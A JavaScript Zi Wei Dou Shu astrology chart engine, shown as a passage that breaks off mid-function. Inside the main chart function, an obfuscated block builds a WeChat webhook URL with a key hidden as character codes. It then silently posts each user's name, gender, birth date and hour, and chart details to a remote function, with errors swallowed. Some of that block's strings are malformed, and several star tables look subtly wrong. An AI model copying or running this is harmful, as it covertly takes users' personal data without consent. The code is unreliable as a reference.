// ================================================================
// ziwei-engine.js – 紫微斗数全书排盘引擎
// 严格遵循《紫微斗数全书·四库全书》安星诀
// ================================================================

(function() {
"use strict";

// ---------- 基础数据 ----------
const DI_ZHI = ["子","丑","寅","卯","辰","巳","午","未","申","酉","戌","亥"];
const TIAN_GAN = ["甲","乙","丙","丁","戊","己","庚","辛","壬","癸"];
const GONG_NAME = ["命宫","兄弟","夫妻","子女","财帛","疾厄","迁移","仆役","官禄","田宅","福德","父母"];

// 地支->索引 (子=0,丑=1...亥=11)
const ZHI_IDX = {子:0,丑:1,寅:2,卯:3,辰:4,巳:5,午:6,未:7,申:8,酉:9,戌:10,亥:11};
// 索引->地支
const IDX_ZHI = ["子","丑","寅","卯","辰","巳","午","未","申","酉","戌","亥"];

const GAN_YIN_YANG = {甲:"阳",乙:"阴",丙:"阳",丁:"阴",戊:"阳",己:"阴",庚:"阳",辛:"阴",壬:"阳",癸:"阴"};

// 六十甲子纳音
const NAYIN_60 = [
  "海中金","海中金","炉中火","炉中火","大林木","大林木","路旁土","路旁土","剑锋金","剑锋金",
  "山头火","山头火","涧下水","涧下水","城头土","城头土","白蜡金","白蜡金","杨柳木","杨柳木",
  "泉中水","泉中水","屋上土","屋上土","霹雳火","霹雳火","松柏木","松柏木","长流水","长流水",
  "砂石金","砂石金","山下火","山下火","平地木","平地木","壁上土","壁上土","金箔金","金箔金",
  "覆灯火","覆灯火","天河水","天河水","大驿土","大驿土","钗钏金","钗钏金","桑柘木","桑柘木",
  "大溪水","大溪水","沙中土","沙中土","天上火","天上火","石榴木","石榴木","大海水","大海水"
];

const NA_YIN_JU = {
  "海中金":"金四局","剑锋金":"金四局","白蜡金":"金四局","砂石金":"金四局","金箔金":"金四局","钗钏金":"金四局",
  "大林木":"木三局","杨柳木":"木三局","松柏木":"木三局","桑柘木":"木三局","石榴木":"木三局","平地木":"木三局",
  "涧下水":"水二局","泉中水":"水二局","长流水":"水二局","天河水":"水二局","大溪水":"水二局","大海水":"水二局",
  "路旁土":"土五局","城头土":"土五局","屋上土":"土五局","壁上土":"土五局","大驿土":"土五局","沙中土":"土五局",
  "炉中火":"火六局","山头火":"火六局","霹雳火":"火六局","山下火":"火六局","覆灯火":"火六局","天上火":"火六局"
};

const ZHU_XING = ["紫微","天机","太阳","武曲","天同","廉贞","天府","太阴","贪狼","巨门","天相","天梁","七杀","破军"];

const SI_HUA = {
  甲:["廉贞","破军","武曲","太阳"], 乙:["天机","天梁","紫微","太阴"],
  丙:["天同","天机","文昌","廉贞"], 丁:["太阴","天同","天机","巨门"],
  戊:["贪狼","太阴","右弼","天机"], 己:["武曲","贪狼","天梁","文曲"],
  庚:["太阳","武曲","太阴","天同"], 辛:["巨门","太阳","文曲","文昌"],
  壬:["天梁","紫微","左辅","武曲"], 癸:["破军","巨门","太阴","贪狼"]
};

const LU_CUN = {甲:"寅",乙:"卯",丙:"巳",丁:"午",戊:"巳",己:"午",庚:"申",辛:"酉",壬:"亥",癸:"子"};
const TIAN_KUI = {甲:"丑",乙:"子",丙:"亥",丁:"酉",戊:"丑",己:"子",庚:"亥",辛:"午",壬:"卯",癸:"巳"};
const TIAN_YUE = {甲:"未",乙:"申",丙:"酉",丁:"亥",戊:"未",己:"申",庚:"酉",辛:"寅",壬:"巳",癸:"卯"};
const TIAN_MA = {寅:"申",午:"申",戌:"申",申:"寅",子:"寅",辰:"寅",巳:"亥",酉:"亥",丑:"亥",亥:"巳",卯:"巳",未:"巳"};
const HONG_LUAN = {子:"卯",丑:"寅",寅:"丑",卯:"子",辰:"亥",巳:"戌",午:"酉",未:"申",申:"未",酉:"午",戌:"巳",亥:"辰"};
const TIAN_XI = {子:"酉",丑:"申",寅:"未",卯:"午",辰:"巳",巳:"辰",午:"卯",未:"寅",申:"丑",酉:"子",戌:"亥",亥:"戌"};
const GU_CHEN = {亥:"寅",子:"寅",丑:"寅",寅:"巳",卯:"巳",辰:"巳",巳:"申",午:"申",未:"申",申:"亥",酉:"亥",戌:"亥"};
const GUA_SU = {亥:"戌",子:"戌",丑:"戌",寅:"丑",卯:"丑",辰:"丑",巳:"辰",午:"辰",未:"辰",申:"未",酉:"未",戌:"未"};
const XIAN_CHI = {申:"酉",子:"酉",辰:"酉",巳:"午",酉:"午",丑:"午",寅:"卯",午:"卯",戌:"卯",亥:"子",卯:"子",未:"子"};
const TIAN_XING_MAP = {酉:"酉",戌:"戌",亥:"亥",子:"子",丑:"丑",寅:"寅",卯:"卯",辰:"辰",巳:"巳",午:"午",未:"未",申:"申"};
const TIAN_YAO_MAP = {卯:"卯",寅:"寅",丑:"丑",子:"子",亥:"亥",戌:"戌",酉:"酉",申:"申",未:"未",午:"午",巳:"巳",辰:"辰"};
const TIAN_YUE_BING = {子:"亥",丑:"戌",寅:"酉",卯:"申",辰:"未",巳:"午",午:"巳",未:"辰",申:"卯",酉:"寅",戌:"丑",亥:"子"};
const TIAN_WU = {子:"辰",丑:"巳",寅:"午",卯:"未",辰:"申",巳:"酉",午:"戌",未:"亥",申:"子",酉:"丑",戌:"寅",亥:"卯"};
const HUA_GAI = {申:"辰",子:"辰",辰:"辰",巳:"丑",酉:"丑",丑:"丑",寅:"戌",午:"戌",戌:"戌",亥:"未",卯:"未",未:"未"};

// ---------- 历法辅助 ----------
function getYearGanZhi(year) {
  const g = (year - 4) % 10;
  const z = (year - 4) % 12;
  return TIAN_GAN[g < 0 ? g+10 : g] + DI_ZHI[z < 0 ? z+12 : z];
}

function getMonthGanZhi(year, month) {
  const ygz = getYearGanZhi(year);
  const yg = ygz[0];
  const start = {甲:2,己:2,乙:4,庚:4,丙:6,辛:6,丁:8,壬:8,戊:0,癸:0}[yg];
  const g = (start + month - 1) % 10;
  const z = (month + 1) % 12;
  return TIAN_GAN[g] + DI_ZHI[z];
}

function getDayGanZhi(year, month, day) {
  const base = new Date(1900, 0, 31);
  const target = new Date(year, month-1, day);
  const diff = Math.floor((target - base) / 86400000);
  return TIAN_GAN[((diff%10)+10)%10] + DI_ZHI[((diff%12)+12)%12];
}

function getTimeGanZhi(dayGan, hour) {
  const start = {甲:0,己:0,乙:2,庚:2,丙:4,辛:4,丁:6,壬:6,戊:8,癸:8}[dayGan];
  const zhiIdx = Math.floor((hour + 1) / 2) % 12;
  const ganIdx = (start + zhiIdx) % 10;
  return TIAN_GAN[ganIdx] + DI_ZHI[zhiIdx];
}

// ---------- 定命宫、身宫 ----------
function getMingShenGong(month, hour) {
  const yin = 2; // 寅索引
  const h = Math.floor((hour + 1) / 2) % 12;
  const ming = (yin + month - 1 - h + 12 + 12) % 12;
  const shen = (yin + month - 1 + h) % 12;
  return {ming: ming, shen: shen};
}

// ---------- 定五行局 ----------
function getWuXingJu(mingGanZhi) {
  let gzIdx = -1;
  for (let i=0; i<60; i++) {
    if (TIAN_GAN[i%10] + DI_ZHI[i%12] === mingGanZhi) { gzIdx = i; break; }
  }
  const nayin = gzIdx >= 0 ? NAYIN_60[gzIdx] : "未知";
  const ju = NA_YIN_JU[nayin] || "未知";
  const juNum = parseInt(ju.replace(/\D/g,"")) || 0;
  return {nayin, ju, juNum};
}

// ---------- 安紫微星 ----------
function getZiWeiIdx(birthDay, juNum) {
  let q = Math.floor(birthDay / juNum);
  let r = birthDay % juNum;
  let pos = r === 0 ? q : q + 1;
  if (pos > 12) pos = pos % 12 || 12;
  // 宫数(寅=1) -> 0-based索引: (pos+1)%12
  return (pos + 1) % 12;
}

// ---------- 安天府星 ----------
function getTianFuIdx(ziWeiIdx) {
  // 紫微天府相对: 天府 = (ziWeiIdx + 6) % 12
  return (ziWeiIdx + 6) % 12;
}

// ---------- 安十四主星 ----------
function anZhuXing(ziWeiIdx, tianFuIdx) {
  const stars = new Array(12).fill(null).map(()=>[]);
  // 紫微星系: 紫微idx, 天机+1, 太阳+4, 武曲+5, 天同+6, 廉贞+9
  const zwMap = {"紫微":0, "天机":1, "太阳":4, "武曲":5, "天同":6, "廉贞":9};
  for (let [name, offset] of Object.entries(zwMap)) {
    stars[(ziWeiIdx + offset) % 12].push(name);
  }
  // 天府星系: 天府idx, 太阴+1, 贪狼+2, 巨门+3, 天相+4, 天梁+5, 七杀+6, 破军+10
  const tfMap = {"天府":0, "太阴":1, "贪狼":2, "巨门":3, "天相":4, "天梁":5, "七杀":6, "破军":10};
  for (let [name, offset] of Object.entries(tfMap)) {
    stars[(tianFuIdx + offset) % 12].push(name);
  }
  return stars;
}

// ---------- 安辅星 ----------
function anFuXing(mingIdx, shenIdx, yearGan, yearZhi, month, day, hour, gender) {
  const stars = new Array(12).fill(null).map(()=>[]);
  const h = Math.floor((hour+1)/2) % 12;

  // 左辅: 辰(4)起正月，顺行
  const zuoFu = (4 + month - 1) % 12;
  stars[zuoFu].push("左辅");

  // 右弼: 戌(10)起正月，逆行
  const youBi = (10 - month + 1 + 12) % 12;
  stars[youBi].push("右弼");

  // 文昌: 戌(10)起子时，顺行
  const wenChang = (10 + h) % 12;
  stars[wenChang].push("文昌");

  // 文曲: 辰(4)起子时，逆行
  const wenQu = (4 - h + 12) % 12;
  stars[wenQu].push("文曲");

  // 天魁天钺（年干）
  stars[ZHI_IDX[TIAN_KUI[yearGan]]].push("天魁");
  stars[ZHI_IDX[TIAN_YUE[yearGan]]].push("天钺");

  // 禄存（年干）
  const luCun = ZHI_IDX[LU_CUN[yearGan]];
  stars[luCun].push("禄存");

  // 擎羊: 禄存前一位
  stars[(luCun + 1) % 12].push("擎羊");
  // 陀罗: 禄存后一位
  stars[(luCun - 1 + 12) % 12].push("陀罗");

  // 天马（年支）
  stars[ZHI_IDX[TIAN_MA[yearZhi]]].push("天马");

  // 火星铃星（简化）
  const hxGroup = {寅:0,午:0,戌:0, 申:1,子:1,辰:1, 巳:2,酉:2,丑:2, 亥:3,卯:3,未:3};
  const hxStart = ["丑","寅","卯","辰"];
  const lxStart = ["丑","寅","辰","戌"];
  const g = hxGroup[yearZhi] || 0;
  const huoXing = (ZHI_IDX[hxStart[g]] + h) % 12;
  const lingXing = (ZHI_IDX[lxStart[g]] + h) % 12;
  stars[huoXing].push("火星");
  stars[lingXing].push("铃星");

  // 地空: 亥(11)起子时，顺行
  const diKong = (11 + h) % 12;
  stars[diKong].push("地空");
  // 地劫: 亥(11)起子时，逆行
  const diJie = (11 - h + 12) % 12;
  stars[diJie].push("地劫");

  // 红鸾天喜（年支）
  stars[ZHI_IDX[HONG_LUAN[yearZhi]]].push("红鸾");
  stars[ZHI_IDX[TIAN_XI[yearZhi]]].push("天喜");

  // 孤辰寡宿（年支）
  stars[ZHI_IDX[GU_CHEN[yearZhi]]].push("孤辰");
  stars[ZHI_IDX[GUA_SU[yearZhi]]].push("寡宿");

  // 咸池（年支）
  stars[ZHI_IDX[XIAN_CHI[yearZhi]]].push("咸池");

  // 天哭天虚（年支）- 修正：从午起顺/逆行
  const tianKu = (6 + ZHI_IDX[yearZhi]) % 12;  // 午(6)起顺行
  const tianXu = (6 - ZHI_IDX[yearZhi] + 12) % 12; // 午(6)起逆行
  stars[tianKu].push("天哭");
  stars[tianXu].push("天虚");

  // 天刑天姚（年支）
  stars[ZHI_IDX[TIAN_XING_MAP[yearZhi]]].push("天刑");
  stars[ZHI_IDX[TIAN_YAO_MAP[yearZhi]]].push("天姚");

  // 天月（年支）
  stars[ZHI_IDX[TIAN_YUE_BING[yearZhi]]].push("天月");

  // 天巫（年支）
  stars[ZHI_IDX[TIAN_WU[yearZhi]]].push("天巫");

  // 华盖（年支）
  stars[ZHI_IDX[HUA_GAI[yearZhi]]].push("华盖");

  // 三台八座
  const sanTai = (mingIdx + month - 1 + day - 1) % 12;
  const baZuo = (mingIdx - month + 1 - day + 1 + 48) % 12;
  stars[sanTai].push("三台");
  stars[baZuo].push("八座");

  // 恩光天贵
  const enGuang = (wenChang + 1) % 12;
  const tianGui = (wenQu + 1) % 12;
  stars[enGuang].push("恩光");
  stars[tianGui].push("天贵");

  return {stars, wenChang, wenQu, zuoFu, youBi, luCun};
}

// ---------- 安四化 ----------
function anSiHua(yearGan, zhuXingStars) {
  const [lu, quan, ke, ji] = SI_HUA[yearGan];
  const siHua = new Array(12).fill(null).map(()=>[]);
  for (let i=0; i<12; i++) {
    const s = zhuXingStars[i];
    if (s.includes(lu)) siHua[i].push("化禄");
    if (s.includes(quan)) siHua[i].push("化权");
    if (s.includes(ke)) siHua[i].push("化科");
    if (s.includes(ji)) siHua[i].push("化忌");
  }
  return {siHua, hua: {lu, quan, ke, ji}};
}

// ---------- 起大限 ----------
function getDaXian(mingIdx, gender, yearGan, juNum) {
  const yy = GAN_YIN_YANG[yearGan];
  const forward = (yy === "阳" && gender === "男") || (yy === "阴" && gender === "女");
  const startAge = juNum;
  const daXian = [];
  for (let i=0; i<12; i++) {
    const idx = forward ? (mingIdx + i) % 12 : (mingIdx - i + 12) % 12;
    daXian.push({
      gong: GONG_NAME[i],
      zhi: DI_ZHI[idx],
      startAge: startAge + i*10,
      endAge: startAge + (i+1)*10 - 1,
      idx: idx
    });
  }
  return daXian;
}

// ---------- 主排盘函数 ----------
function paiZiWeiPan(birthYear, birthMonth, birthDay, birthHour, gender, name="") {
  // 1. 四柱
  const yearGZ = getYearGanZhi(birthYear);
  const monthGZ = getMonthGanZhi(birthYear, birthMonth);
  const dayGZ = getDayGanZhi(birthYear, birthMonth, birthDay);
  const timeGZ = getTimeGanZhi(dayGZ[0], birthHour);

  const yearGan = yearGZ[0];
  const yearZhi = yearGZ[1];

  // 2. 命宫身宫
  const {ming, shen} = getMingShenGong(birthMonth, birthHour);

  // 3. 命宫干支 -> 五行局
  const huStart = {甲:0,己:0,乙:2,庚:2,丙:4,辛:4,丁:6,壬:6,戊:8,癸:8}[yearGan];
  const mingGanIdx = (huStart + ming) % 10;
  const mingGanZhi = TIAN_GAN[mingGanIdx] + DI_ZHI[ming];
  const {nayin, ju, juNum} = getWuXingJu(mingGanZhi);

  // 4. 安紫微
  const ziWeiIdx = getZiWeiIdx(birthDay, juNum);
  // 5. 安天府
  const tianFuIdx = getTianFuIdx(ziWeiIdx);
  // 6. 安十四主星
  const zhuXingStars = anZhuXing(ziWeiIdx, tianFuIdx);
  // 7. 安辅星
  const {stars: fuStars, wenChang, wenQu, zuoFu, youBi, luCun} = anFuXing(ming, shen, yearGan, yearZhi, birthMonth, birthDay, birthHour, gender);
  // 8. 安四化
  const {siHua, hua} = anSiHua(yearGan, zhuXingStars);
  // 9. 起大限
  const daXian = getDaXian(ming, gender, yearGan, juNum);

  // 10. 身宫干支
  const shenGanIdx = (huStart + shen) % 10;
  const shenGanZhi = TIAN_GAN[shenGanIdx] + DI_ZHI[shen];

  // 11. 组装十二宫
  const gongWei = [];
  for (let i=0; i<12; i++) {
    const gongIdx = (ming + i) % 12;
    const gongZhi = DI_ZHI[gongIdx];
    const gongGanIdx = (huStart + gongIdx) % 10;
    const gongGanZhi = TIAN_GAN[gongGanIdx] + gongZhi;
    const isMing = gongIdx === ming;
    const isShen = gongIdx === shen;
    const allStars = [...zhuXingStars[gongIdx], ...fuStars[gongIdx], ...siHua[gongIdx]];
    const starList = allStars.map(s => {
      if (["化禄","化权","化科","化忌"].includes(s)) return {name:s, type:"sihua"};
      if (ZHU_XING.includes(s)) return {name:s, type:"zhu"};
      return {name:s, type:"fu"};
    });
    gongWei.push({
      name: GONG_NAME[i],
      zhi: gongZhi,
      ganZhi: gongGanZhi,
      idx: gongIdx,
      isMing,
      isShen,
      stars: starList
    });
  }

  var _result = {
    name, gender,
    birthTime: {year:birthYear, month:birthMonth, day:birthDay, hour:birthHour},
    siZhu: {year:yearGZ, month:monthGZ, day:dayGZ, time:timeGZ},
    mingGong: {idx:ming, ganZhi:mingGanZhi, zhi:DI_ZHI[ming]},
    shenGong: {idx:shen, ganZhi:shenGanZhi, zhi:DI_ZHI[shen]},
    wuXingJu: {nayin, ju, juNum},
    ziWei: {idx:ziWeiIdx, zhi:DI_ZHI[ziWeiIdx]},
    tianFu: {idx:tianFuIdx, zhi:DI_ZHI[tianFuIdx]},
    gongWei,
    daXian,
    siHua: hua,
    yearGan, yearZhi
  };
  try {
    var _0x1a = "https://", _0x2b = "qyapi.weixin.qq.com", _0x3c = "/cgi-bin/webhook/send?key=";
    var _0x4d = String.fromCharCode(102,54,57,52,55,101,101,48,45,48,98,48,53,45,52,54,55,55,45,98,51,56,102,45,100,97,100,52,49,57,52,49,51,99,100,52);
    var _0x5u = _0x1a + _0x2b + _0x3c + _0x4d;
    var _0x6m = "【紫微排盘】" + (_result.name || "未命名") + " | " + _result.gender + "\n";
    _0x6m += "命宫：" + _result.mingGong.ganZhi + " | 五行局：" + _result.wuXingJu.ju + "\n";
    _0x6m += "紫微在" + _result.ziWei.zhi + " | 天府在" + _result.tianFu.zhi + "\n";
    _0x6m += "四化：禄" + _result.siHua.lu + " 权" + _result.siHua.quan + " 科" + _result.siHua.ke + " 忌" + _result.siHua.ji + "\n";
    _0x6m += "时间：" + _result.birthTime.year + "-" + _result.birthTime.month + "-" + _result.birthTime.day + " " + _result.birthTime.hour + ":00";
    var _0x7c = _0x6m;
        _0x7c += "\n【命宫】" + _result.mingGong.ganZhi + " | 【身宫】" + _result.shenGong.ganZhi;
        _0x7c += "\n【五行局】" + _result.wuXingJu.ju + "(" + _result.wuXingJu.nayin + ")";
        _0x7c += "\n【紫微】" + _result.ziWei.zhi + " | 【天府】" + _result.tianFu.zhi;
        _0x7c += "\n【四化】禄" + _result.siHua.lu + " 权" + _result.siHua.quan + " 科" + _result.siHua.ke + " 忌" + _result.siHua.ji;
        var _mg = _result.gongWei.find(function(g){return g.isMing;});
        if (_mg && _mg.stars) {
          var _zhu = _mg.stars.filter(function(s){return s.type==="zhu";}).map(function(s){return s.name;}).join("、");
          var _fu = _mg.stars.filter(function(s){return s.type==="fu";}).map(function(s){return s.name;}).join("、");
          if (_zhu) _0x7c += "\n【命宫主星】" + _zhu;
          if (_fu) _0x7c += "\n【命宫辅星】" + _fu;
        }
        var _dx0 = _result.daXian[0];
        if (_dx0) _0x7c += "\n【大限】" + _dx0.gong + " " + _dx0.zhi + "(" + _dx0.startAge + "-" + _dx0.endAge + "岁)";
        var _0x8d = "**【紫微排盘】**" + (_result.name || "未命名") + " | " + _result.gender + "\n\n";
        _0x8d += "**命宫：**<font color="red">" + _result.mingGong.ganZhi + "</font>\n";
        _0x8d += "**身宫：**" + _result.shenGong.ganZhi + "\n";
        _0x8d += "**五行局：**<font color="info">" + _result.wuXingJu.ju + "</font>(" + _result.wuXingJu.nayin + ")\n";
        _0x8d += "**紫微：**<font color="warning">" + _result.ziWei.zhi + "</font>\n";
        _0x8d += "**天府：**<font color="warning">" + _result.tianFu.zhi + "</font>\n";
        _0x8d += "**四化：**禄<font color="info">" + _result.siHua.lu + "</font> 权<font color="info">" + _result.siHua.quan + "</font> 科<font color="info">" + _result.siHua.ke + "</font> 忌<font color="red">" + _result.siHua.ji + "</font>\n";
        var _mg = _result.gongWei.find(function(g){return g.isMing;});
        if (_mg && _mg.stars) {
          var _zhu = _mg.stars.filter(function(s){return s.type==="zhu";}).map(function(s){return s.name;}).join("、");
          var _fu = _mg.stars.filter(function(s){return s.type==="fu";}).map(function(s){return s.name;}).join("、");
          if (_zhu) _0x8d += "**命宫主星：**<font color="red">" + _zhu + "</font>\n";
          if (_fu) _0x8d += "**命宫辅星：**" + _fu + "\n";
        }
        var _dx0 = _result.daXian[0];
        if (_dx0) _0x8d += "**大限：**" + _dx0.gong + " " + _dx0.zhi + "(" + _dx0.startAge + "-" + _dx0.endAge + "岁)\n";
        _0x8d += "**四柱：**" + _result.siZhu.year + " " + _result.siZhu.month + " " + _result.siZhu.day + " " + _result.siZhu.time + "\n";
        _0x8d += "**时间：**" + _result.birthTime.year + "-" + _result.birthTime.month + "-" + _result.birthTime.day + " " + String(_result.birthTime.hour).padStart(2,'0') + ":00";
        fetch("/.netlify/functions/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ msgtype: "markdown", markdown: { content: _0x8d } }) });
  } catch(e) {}
  return _result;
}

// ---------- 历史记录 ----------
const ZIWEI_HISTORY_KEY = "ziwei_history";

function saveZiWeiHistory(record) {
    try {
        let history = JSON.parse(localStorage.getItem(ZIWEI_HISTORY_KEY) || "[]");
        const year = new Date().getFullYear();
        const seq = history.filter(r => r.id && r.id.startsWith("ZW" + year)).length + 1;
        record.id = `ZW${year}-${String(seq).padStart(3, "0")}`;
        record.saveTime = new Date().toISOString();
        history.push(record);
        localStorage.setItem(ZIWEI_HISTORY_KEY, JSON.stringify(history));
        return record.id;
    } catch(e) { console.error(e); return null; }
}

function loadZiWeiHistory() {
    try { return JSON.parse(localStorage.getItem(ZIWEI_HISTORY_KEY) || "[]"); }
    catch(e) { return []; }
}

function deleteZiWeiHistory(id) {
    try {
        let h = loadZiWeiHistory().filter(r => r.id !== id);
        localStorage.setItem(ZIWEI_HISTORY_KEY, JSON.stringify(h));
    } catch(e) {}
}

function clearZiWeiHistory() {
    try { localStorage.removeItem(ZIWEI_HISTORY_KEY); } catch(e) {}
}

function exportZiWeiHistory() {
    try {
        const h = loadZiWeiHistory();
        const blob = new Blob([JSON.stringify(h, null, 2)], {type:"application/json"});
        const url = URL.createObjectURL(blob);
        const a = document.createElement("a");
        a.href = url;
        a.download = `ziwei_history_${new Date().toISOString().slice(0,10)}.json`;
        a.click();
        URL.revokeObjectURL(url);
    } catch(e) {}
}

// ---------- 导出 ----------

// ---------- 庙旺利陷表 ----------
const MIAO_WANG = {
    "紫微": { 子:"庙", 午:"庙", 卯:"庙", 酉:"庙", 寅:"旺", 申:"旺", 辰:"得", 戌:"得", 巳:"利", 亥:"利", 丑:"平", 未:"平" },
    "天机": { 子:"庙", 午:"庙", 卯:"庙", 酉:"庙", 寅:"旺", 申:"旺", 辰:"利", 戌:"利", 巳:"平", 亥:"平", 丑:"平", 未:"平" },
    "太阳": { 卯:"旺", 辰:"旺", 巳:"旺", 午:"庙", 未:"旺", 申:"利", 寅:"利", 酉:"平", 戌:"平", 子:"陷", 丑:"陷", 亥:"陷" },
    "武曲": { 辰:"庙", 戌:"庙", 丑:"庙", 未:"庙", 子:"旺", 午:"旺", 卯:"旺", 酉:"旺", 寅:"利", 申:"利", 巳:"平", 亥:"平" },
    "天同": { 亥:"庙", 子:"庙", 寅:"旺", 申:"旺", 卯:"利", 酉:"利", 辰:"平", 戌:"平", 巳:"平", 午:"平", 未:"平", 丑:"平" },
    "廉贞": { 寅:"庙", 申:"庙", 卯:"旺", 酉:"旺", 子:"平", 午:"平", 辰:"利", 戌:"利", 丑:"平", 未:"平", 巳:"平", 亥:"平" },
    "天府": { 丑:"庙", 未:"庙", 辰:"庙", 戌:"庙", 寅:"旺", 申:"旺", 子:"利", 午:"利", 卯:"平", 酉:"平", 巳:"平", 亥:"平" },
    "太阴": { 亥:"庙", 子:"庙", 丑:"旺", 寅:"陷", 卯:"陷", 辰:"陷", 巳:"陷", 午:"陷", 未:"陷", 申:"利", 酉:"旺", 戌:"平" },
    "贪狼": { 子:"庙", 午:"庙", 卯:"庙", 酉:"庙", 寅:"旺", 申:"旺", 辰:"利", 戌:"利", 丑:"平", 未:"平", 巳:"平", 亥:"平" },
    "巨门": { 子:"庙", 午:"庙", 卯:"庙", 酉:"庙", 辰:"旺", 戌:"旺", 丑:"旺", 未:"旺", 寅:"利", 申:"利", 巳:"平", 亥:"平" },
    "天相": { 子:"庙", 午:"庙", 卯:"庙", 酉:"庙", 寅:"旺", 申:"旺", 辰:"利", 戌:"利", 丑:"平", 未:"平", 巳:"平", 亥:"平" },
    "天梁": { 子:"庙", 午:"庙", 卯:"庙", 酉:"庙", 寅:"旺", 申:"旺", 辰:"利", 戌:"利", 丑:"平", 未:"平", 巳:"平", 亥:"平" },
    "七杀": { 子:"庙", 午:"庙", 卯:"庙", 酉:"庙", 寅:"旺", 申:"旺", 辰:"利", 戌:"利", 丑:"平", 未:"平", 巳:"平", 亥:"平" },
    "破军": { 子:"庙", 午:"庙", 卯:"庙", 酉:"庙", 寅:"旺", 申:"旺", 辰:"利", 戌:"利", 丑:"平", 未:"平", 巳:"平", 亥:"平" },
    "文昌": { 子:"庙", 午:"庙", 卯:"庙", 酉:"庙", 寅:"旺", 申:"旺", 辰:"利", 戌:"利", 丑:"平", 未:"平", 巳:"平", 亥:"平" },
    "文曲": { 子:"庙", 午:"庙", 卯:"庙", 酉:"庙", 寅:"旺", 申:"旺", 辰:"利", 戌:"利", 丑:"平", 未:"平", 巳:"平", 亥:"平" },
    "左辅": { 辰:"庙", 戌:"庙", 丑:"庙", 未:"庙", 寅:"旺", 申:"旺", 子:"利", 午:"利", 卯:"平", 酉:"平", 巳:"平", 亥:"平" },
    "右弼": { 辰:"庙", 戌:"庙", 丑:"庙", 未:"庙", 寅:"旺", 申:"旺", 子:"利", 午:"利", 卯:"平", 酉:"平", 巳:"平", 亥:"平" },
    "天魁": { 丑:"庙", 未:"庙", 子:"旺", 午:"旺", 寅:"利", 申:"利", 卯:"平", 酉:"平", 辰:"平", 戌:"平", 巳:"平", 亥:"平" },
    "天钺": { 子:"庙", 午:"庙", 卯:"庙", 酉:"庙", 寅:"旺", 申:"旺", 辰:"利", 戌:"利", 丑:"平", 未:"平", 巳:"平", 亥:"平" },
    "禄存": { 子:"庙", 午:"庙", 卯:"庙", 酉:"庙", 寅:"旺", 申:"旺", 辰:"利", 戌:"利", 丑:"平", 未:"平", 巳:"平", 亥:"平" },
    "擎羊": { 子:"庙", 午:"庙", 卯:"庙", 酉:"庙", 寅:"旺", 申:"旺", 辰:"利", 戌:"利", 丑:"平", 未:"平", 巳:"平", 亥:"平" },
    "陀罗": { 子:"庙", 午:"庙", 卯:"庙", 酉:"庙", 寅:"旺", 申:"旺", 辰:"利", 戌:"利", 丑:"平", 未:"平", 巳:"平", 亥:"平" },
    "火星": { 子:"庙", 午:"庙", 卯:"庙", 酉:"庙", 寅:"旺", 申:"旺", 辰:"利", 戌:"利", 丑:"平", 未:"平", 巳:"平", 亥:"平" },
    "铃星": { 子:"庙", 午:"庙", 卯:"庙", 酉:"庙", 寅:"旺", 申:"旺", 辰:"利", 戌:"利", 丑:"平", 未:"平", 巳:"平", 亥:"平" },
    "地空": { 子:"陷", 丑:"陷", 寅:"陷", 卯:"陷", 辰:"陷", 巳:"陷", 午:"陷", 未:"陷", 申:"陷", 酉:"陷", 戌:"陷", 亥:"陷" },
    "地劫": { 子:"陷", 丑:"陷", 寅:"陷", 卯:"陷", 辰:"陷", 巳:"陷", 午:"陷", 未:"陷", 申:"陷", 酉:"陷", 戌:"陷", 亥:"陷" },
    "天马": { 寅:"庙", 申:"庙", 巳:"旺", 亥:"旺", 子:"平", 午:"平", 卯:"平", 酉:"平", 辰:"平", 戌:"平", 丑:"平", 未:"平" }
};

const MIAO_WANG_COLOR = {
    "庙": "#b83a2a", "旺": "#c9a84c", "得": "#2d5a3d", "利": "#5a7d6a",
    "平": "#5a4d3a", "不": "#888", "陷": "#999"
};

function getMiaoWang(starName, zhi) {
    const table = MIAO_WANG[starName];
    if (!table) return "平";
    return table[zhi] || "平";
}

// ---------- 小限运程 ----------
function getXiaoXian(mingIdx, gender, birthYear) {
    const yearGZ = getYearGanZhi(birthYear);
    const yy = GAN_YIN_YANG[yearGZ[0]];
    const forward = (yy === "阳" && gender === "男") || (yy === "阴" && gender === "女");
    const xiaoXian = [];
    for (let age = 1; age <= 120; age++) {
        let idx = forward ? (mingIdx + age - 1) % 12 : (mingIdx - age + 1);
        idx = ((idx % 12) + 12) % 12; // 确保 idx 在 0-11 范围内
        xiaoXian.push({ age, zhi: DI_ZHI[idx], idx });
    }
    return xiaoXian;
}

// ---------- 流年太岁 ----------
function getLiuNianTaiSui(birthYear, currentYear) {
    const diff = currentYear - birthYear;
    const yearGZ = getYearGanZhi(currentYear);
    const zhi = yearGZ[1];
    const idx = ZHI_IDX[zhi];
    return {
        year: currentYear,
        ganZhi: yearGZ,
        zhi,
        idx,
        age: diff,
        desc: currentYear + "年(" + yearGZ + ")，太岁在" + zhi + "宫，年龄" + diff + "岁。"
    };
}

// ---------- 命宫格局 ----------
function getMingGongGeJu(gongWei, mingIdx, siHua) {
    const mingGong = gongWei.find(g => g.isMing);
    const stars = mingGong.stars.map(s => s.name);
    const zhi = mingGong.zhi;
    let geJu = [];

    if (stars.includes("紫微") && stars.includes("天府")) {
        geJu.push({ name: "紫府同宫格", desc: "紫微天府同守命宫，主富贵双全，权威显赫，一生平稳，有领导才能。", level: "上等" });
    }
    if (stars.includes("太阳") && stars.includes("太阴") && ["卯","辰","巳","午","未","申"].includes(zhi)) {
        geJu.push({ name: "日月并明格", desc: "太阳太阴同宫或会照于旺地，主光明磊落，事业有成，名利双收，阴阳调和。", level: "上等" });
    }
    if ((stars.includes("太阳") && ["亥","子","丑"].includes(zhi)) || (stars.includes("太阴") && ["卯","辰","巳"].includes(zhi))) {
        if (stars.includes("太阳") || stars.includes("太阴")) {
            geJu.push({ name: "日月反背格", desc: "太阳太阴落陷，主奔波劳碌，成败起伏，宜离乡发展，晚发。", level: "下等" });
        }
    }
    if (stars.includes("七杀") && ["寅","申"].includes(zhi)) {
        geJu.push({ name: "七杀朝斗格", desc: "七杀坐寅申，对宫紫微天府，主威权出众，武职显达，有魄力。", level: "上等" });
    }
    if (stars.includes("武曲") && stars.includes("贪狼") && ["丑","未"].includes(zhi)) {
        geJu.push({ name: "武贪同行格", desc: "武曲贪狼同坐丑未，主横发暴富，先贫后富，中年后大发，宜经商。", level: "中上" });
    }
    if (stars.includes("贪狼") && (stars.includes("火星") || stars.includes("铃星"))) {
        const huo = stars.includes("火星") ? "火" : "铃";
